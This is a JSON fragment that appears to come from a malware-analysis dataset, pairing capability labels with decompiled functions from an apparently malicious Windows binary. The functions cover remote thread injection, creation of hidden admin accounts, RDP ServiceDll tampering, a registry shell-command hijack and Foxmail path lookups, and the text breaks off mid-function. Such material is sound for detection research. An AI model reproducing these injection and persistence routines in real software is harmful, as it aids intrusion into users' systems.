        "decompiled_code": "\nuint __fastcall fcn.00410951(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00401085(0x108);\n    if ((iVar1 == 0) || (param_1 == 0)) {\n        fcn.00401099(iVar1);\n        uVar2 = 0;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar1, param_1);\n        *(iVar1 + 0x104) = param_2;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00410363, iVar1, 0, 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 180
    },
    "00413f7f": {
        "rules": [
            "create thread",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "open process",
            "write process memory",
            "inject thread",
            "spawn thread to RWX shellcode"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413f7f(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_10ch;\n    uint var_108h;\n    uint lpflOldProtect;\n    uint hProcess;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, param_2);\n    hProcess = uVar3;\n    var_10ch = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar4 = fcn.00401085(0xff);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, uVar4, 0xff);\n    fcn.004011a4(&var_108h, uVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(uVar3, 0, 0x800, 0x3000, 0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteProcessMemory;\n    (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar3, iVar5, 0x426208, 0x800, 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(hProcess, iVar5, 0x800, 0x40, &lpflOldProtect);\n    uVar3 = (*pcVar2)(hProcess, 0, 0x103, 0x3000, 4);\n    (*pcVar1)(hProcess, uVar3, &var_10ch, 0x103, 0);\n    *0x559cb4 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(hProcess, 0, 0, iVar5 + 0x10e, uVar3, 0, 0);\n    return;\n}\n",
        "token_count": 448
    },
    "0040d3a8": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d3a8(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    uVar5 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 0x10);\n    if (iVar3 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n    if (iVar4 == 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x420) goto code_r0x0040d418;\n        (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n        iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(iVar3, 0, 0);\n        if (iVar4 == 0) goto code_r0x0040d418;\n    }\n    uVar5 = 1;\ncode_r0x0040d418:\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    (*pcVar1)(iVar3);\n    return uVar5;\n}\n",
        "token_count": 373
    },
    "004112b2": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004112b2(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 61
    },
    "0041178e": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0041178e(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return iVar1 == 0;\n}\n",
        "token_count": 61
    },
    "0041338d": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041338d(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(1);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    return (iVar1 * (arg_8h * 0x359 + 1)) % 10000;\n}\n",
        "token_count": 85
    },
    "0040278b": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040278b(uint param_1, int32_t param_2)\n\n{\n    uint lpFile;\n    \n    if (*(param_2 + 4) == 0) {\n        fcn.0040373f(param_2 + 8);\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x4176a8, param_1, 0, 0, 5);\n        fcn.00405feb();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "004038b3": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038b3(uint arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = arg_8h;\n    in_ECX[1] = 0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "00404a78": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a78(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x417860;\n    fcn.0040373f(&arg_8h);\n    in_ECX[2] = arg_ch;\n    *(in_ECX + 3) = arg_10h;\n    fcn.0040373f(&arg_14h);\n    fcn.004013b3(&arg_18h);\n    fcn.00405feb();\n    arg_14h = 0;\n    fcn.00405feb();\n    arg_8h = 0;\n    if (arg_18h != 0) {\n        fcn.00401b27(arg_18h);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00405f68": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405f68(uint param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    fcn.00406077(param_1);\n    return uVar1;\n}\n",
        "token_count": 74
    },
    "00405ffa": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ffa(uint param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    return;\n}\n",
        "token_count": 48
    },
    "0040e92c": {
        "rules": [
            "allocate memory"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e92c(uint flNewProtect, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint lpflOldProtect;\n    \n    iVar1 = *in_ECX[1];\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(*in_ECX);\n    }\n    else {\n        if (iVar1 != 1) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*in_ECX[1][1], *in_ECX);\n    }\n    if ((iVar1 != 0) && (arg_ch != NULL)) {\n        *arg_ch = in_ECX;\n    }\n    return iVar1;\n}\n",
        "token_count": 176
    },
    "004061f0": {
        "rules": [
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_108h;\n    uint var_8h;\n    \n    fcn.0040315e(&arg_10h);\n    iVar1 = 0;\n    do {\n        *(&var_108h + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x100);\n    fcn.00406154(arg_ch);\n    fcn.004060e7(arg_14h);\n    fcn.0040315e(&arg_10h);\n    fcn.00403148();\n    fcn.00403148();\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 182
    },
    "0041229c": {
        "rules": [
            "open process",
            "terminate process"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041229c(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, param_1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "004094ff": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint fcn.004094ff(void)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\\\\Aerofox\\\\FoxmailPreview\", 0, 0x20019, &hKey);\n    if (iVar1 == 0) {\n        var_4h = 0x104;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, \"Executable\", 0, 0, 0x426868, &var_4h);\n        if (iVar1 == 0) {\n            (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecA)(0x426868);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "0040d856": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.0040d856(void)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint arg_8h;\n    uint uVar2;\n    char16_t *arg_ch;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpSubKey;\n    uint var_ch;\n    uint phkResult;\n    \n    uVar2 = 0;\n    phkResult = 0;\n    fcn.004036f7(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_18h = 0;\n    var_14h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x102, &phkResult);\n    if (iVar1 == 0) {\n        arg_10h = fcn.00403333(&var_20h);\n        arg_ch = L\"ServiceDll\";\n        arg_8h = fcn.004036f7(L\"ServiceDll\");\n        iVar1 = fcn.004125df(arg_8h, arg_ch, arg_10h);\n        fcn.00405feb();\n        var_ch = 0;\n        fcn.00403148();\n        fcn.00412554();\n        if (iVar1 != 0) {\n            uVar2 = 1;\n        }\n    }\n    fcn.00403148();\n    fcn.00405feb();\n    fcn.00412554();\n    return uVar2;\n}\n",
        "token_count": 347
    },
    "0040db52": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nvoid fcn.0040db52(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *pcVar4;\n    uint *puVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpSubKey;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    fcn.004036f7(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\");\n    fcn.004036f7(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_20h = 0;\n    var_1ch = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar2 != 0) goto code_r0x0040dc9b;\n    puVar5 = &var_20h;\n    pcVar4 = L\"ImagePath\";\n    uVar3 = fcn.004036f7(L\"ImagePath\");\n    iVar2 = fcn.00412569(uVar3, pcVar4);\n    fcn.00405feb(uVar3, pcVar4, puVar5);\n    fcn.00412554();\n    if (iVar2 == 0) goto code_r0x0040dc9b;\n    fcn.0040300a(&var_8h);\n    fcn.004030fe();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrW;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrW)(var_8h, L\"svchost.exe\");\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(var_8h, L\"svchost.exe -k\");\n        if (iVar2 != 0) goto code_r0x0040dc0f;\n    }\n    else {\ncode_r0x0040dc0f:\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, var_10h, 0, 0x20119, &phkResult);\n        if (iVar2 == 0) {\n            pcVar4 = L\"ServiceDll\";\n            uVar3 = fcn.004036f7(L\"ServiceDll\");\n            iVar2 = fcn.00412569(uVar3, pcVar4);\n            fcn.00405feb();\n            if (iVar2 != 0) {\n                fcn.0040300a(&var_18h);\n                uVar3 = fcn.004032e6();\n                fcn.00403549(uVar3);\n                fcn.00405feb();\n                var_ch = 0;\n                fcn.00405feb();\n            }\n            fcn.00412554();\n        }\n    }\n    fcn.00405feb();\n    var_8h = 0;\ncode_r0x0040dc9b:\n    fcn.00403148();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00412554();\n    return;\n}\n",
        "token_count": 726
    },
    "0040dcbf": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.0040dcbf(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint uVar4;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint lpSubKey;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    fcn.004036f7(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_14h = 0;\n    var_10h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar1 == 0) {\n        puVar3 = &var_14h;\n        arg_ch = L\"ServiceDll\";\n        uVar2 = fcn.004036f7(L\"ServiceDll\");\n        iVar1 = fcn.00412569(uVar2, arg_ch);\n        fcn.00405feb(uVar2, arg_ch, puVar3);\n        if (iVar1 != 0) {\n            uVar4 = 0x55ad4c;\n            puVar3 = &var_8h;\n            fcn.0040300a(puVar3);\n            uVar2 = fcn.0040335a(puVar3);\n            fcn.00405feb(puVar3, uVar4);\n            var_8h = 0;\n            goto code_r0x0040dd2d;\n        }\n        fcn.00412554();\n    }\n    uVar2 = 0;\ncode_r0x0040dd2d:\n    fcn.00403148();\n    fcn.00405feb();\n    fcn.00412554();\n    return uVar2;\n}\n",
        "token_count": 417
    },
    "00412612": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412612(uint hKey, uint *arg_ch, uint samDesired, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_14h != 0) && (iVar1 = fcn.00410c50(),  iVar1 == 0)) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, *arg_ch, 0, 0, 0, samDesired, 0);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00412554();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, *arg_ch, 0, samDesired);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 198
    },
    "00412e2c": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412e2c(uint lpValueName, uint lpString)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint hKey;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                      (0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\", 0, 0x20006, &hKey);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, lpValueName, 0, 1, lpString, uVar1);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_SetLastError)(iVar2);\n    return 0;\n}\n",
        "token_count": 219
    },
    "00412e91": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.00412e91(void)\n\n{\n    int32_t iVar1;\n    uint pSecurityDescriptor;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&pSecurityDescriptor, 1);\n    if ((iVar1 != 0) &&\n       (iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(&pSecurityDescriptor, 1, 0, 0),  iVar1 != 0)) {\n        var_10h = &pSecurityDescriptor;\n        var_14h = 0xc;\n        var_ch = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\", 0, 0, 0, 0x20006, &var_14h, \n                           &hKey, &var_8h);\n        if (iVar1 == 0) {\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_SetLastError)(iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 294
    },
    "0040c3b9": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c3b9(uint *pcbBinary)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar2;\n    uint pszString;\n    \n    iVar2 = 0;\n    *pcbBinary = 0;\n    *in_EDX = 0;\n    iVar1 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryW)();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, *pcbBinary);\n        *in_EDX = iVar1;\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryW)(in_ECX, 0, 1, iVar1, pcbBinary, 0, 0);\n            if (iVar2 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LocalFree)(*in_EDX);\n                *in_EDX = iVar1;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 242
    },
    "0040d2b8": {
        "rules": [
            "add user account"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d2b8(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h;\n    puVar3 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_20h = *arg_8h;\n    var_14h = 1;\n    var_10h = 0;\n    var_1ch = *arg_ch;\n    var_ch = 0;\n    var_8h = 0x10201;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.NETAPI32.dll_NetUserAdd)(0, 1, &var_20h, 0);\n    if (iVar2 == 0) {\n        arg_8h = *puVar1;\n        puVar1 = fcn.00410a8c();\n        iVar2 = (*_sym.imp.NETAPI32.dll_NetLocalGroupAddMembers)(0, *puVar1, 3, &arg_8h, 1);\n        fcn.00405feb();\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 369
    },
    "00411e6d": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.00411e6d(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(in_FS_OFFSET + 0x30) != 0) {\n        return *(***(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);\n    }\n    return 0;\n}\n",
        "token_count": 78
    },
    "00413559": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413559(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00401133(arg_8h);\n    iVar2 = 0;\n    if (0 < in_EDX) {\n        do {\n            *(iVar2 + in_ECX) = *(iVar2 + in_ECX) ^ *(iVar2 % iVar1 + arg_8h);\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < in_EDX);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00401133": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00401133(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    return pcVar2 + (-1 - param_1);\n}\n",
        "token_count": 89
    },
    "004011a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.004011a4(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *param_2;\n        *pcVar2 = cVar1;\n        pcVar2 = pcVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (cVar1 != '\\0');\n    return param_1;\n}\n",
        "token_count": 111
    },
    "00402503": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402503(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    \n    uVar4 = in_ECX[2];\n    if (uVar4 < in_ECX[1]) {\n        iVar3 = *in_ECX;\n    }\n    else {\n        iVar1 = uVar4 + 1;\n        iVar2 = in_ECX[3];\n        iVar3 = fcn.00406099();\n        uVar4 = 0;\n        if (in_ECX[2] != 0) {\n            do {\n                *(iVar3 + uVar4 * 4) = *(*in_ECX + uVar4 * 4);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < in_ECX[2]);\n        }\n        uVar4 = in_ECX[2];\n        in_ECX[1] = iVar1 * iVar2;\n        *in_ECX = iVar3;\n    }\n    *(iVar3 + uVar4 * 4) = arg_8h;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 281
    },
    "00405ecb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405ecb(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    \n    if (*0x55ad90 != 0) {\n        uVar1 = 0;\n        uVar2 = *0x55a85c + *0x55ad90 + (3 - *0x55a85c) >> 2;\n        if (*0x55a85c + *0x55ad90 < *0x55a85c) {\n            uVar2 = 0;\n        }\n        ppcVar3 = *0x55a85c;\n        if (uVar2 != 0) {\n            do {\n                if (*ppcVar3 != NULL) {\n                    (**ppcVar3)();\n                }\n                ppcVar3 = ppcVar3 + 1;\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < uVar2);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "00406056": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406056(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uchar *in_EDX;\n    int32_t iVar1;\n    \n    if (arg_8h != 0) {\n        iVar1 = in_ECX - in_EDX;\n        do {\n            in_EDX[iVar1] = *in_EDX;\n            in_EDX = in_EDX + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0040c2cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c2cc(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    if ((param_1 != 0) && (param_2 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, param_2 * 2 + 2);\n        if ((iVar1 != 0) && (param_2 != 0)) {\n            do {\n                *(iVar1 + uVar2 * 2) = *(uVar2 + param_1);\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < param_2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "0041196e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041196e(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    fcn.004113ed();\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    iVar3 = 5;\n    *(param_1 + 0x38) = 5;\n    *(param_1 + 0x30) = 5;\n    *(param_1 + 0x34) = 0;\n    puVar1 = fcn.00406099();\n    if (puVar1 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar1 + 0xb;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar3 = iVar3 + -1;\n            puVar1 = puVar1 + 0xc;\n        } while (iVar3 != 0);\n    }\n    *(param_1 + 0x2c) = puVar2;\n    *(param_1 + 0x3c) = 0;\n    return param_1;\n}\n",
        "token_count": 300
    },
    "004143ee": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004143ee(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    iVar2 = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    ppv = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x417600, 0, 1, 0x4175b0, &ppv);\n    if (ppv != NULL) {\n        (**(*ppv + 0xc))(ppv, 0x4175f0, &var_4h, 0);\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x14))(var_4h);\n            while( true ) {\n                iVar1 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, 0);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 1;\n                if (var_ch != NULL) {\n                    (**(*var_ch + 8))(var_ch);\n                    var_ch = NULL;\n                }\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 8))(var_4h);\n                var_4h = NULL;\n            }\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return iVar2;\n}\n",
        "token_count": 357
    },
    "00414666": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00414666(uint noname_0, int32_t **arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = arg_ch;\n    iVar2 = *in_ECX;\n    iVar4 = 0;\n    *arg_ch = NULL;\n    puVar5 = &var_8h;\n    var_ch = in_EDX;\n    iVar2 = (**(iVar2 + 0x28))();\n    if (-1 < iVar2) {\n        iVar2 = -0x7fffbffb;\n        while (iVar3 = (**(*var_8h + 0xc))(var_8h, 1, &arg_ch, &var_10h),  iVar3 == 0) {\n            var_4h = 3;\n            (*(*arg_ch)[9])(arg_ch, &var_4h);\n            if (var_4h == var_ch) {\n                if (iVar4 == 0) {\n                    *ppiVar1 = arg_ch;\n                    return 0;\n                }\n                iVar4 = iVar4 + -1;\n            }\n            (*(*arg_ch)[2])(arg_ch, puVar5);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 345
    },
    "004148b6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004148b6(void)\n\n{\n    int16_t *piVar1;\n    uchar uVar2;\n    int16_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint pvarg;\n    int16_t *var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    var_ch = NULL;\n    ppv = NULL;\n    var_4h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x417600, 0, 1, 0x41a77c, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x4175f0, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        iVar6 = 0;\n        while( true ) {\n            iVar7 = 0;\n            var_10h = 0;\n            iVar5 = (**(*var_4h + 0xc))(var_4h, 1, &var_14h, &var_10h);\n            if ((iVar5 != 0) ||\n               (piVar4 = var_14h + iVar6 * 4,  iVar5 = (**(*piVar4 + 0x24))(piVar4, 0, 0, 0x417580, &var_ch), \n               iVar5 != 0)) break;\n            (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n            iVar5 = (**(*var_ch + 0xc))(var_ch, 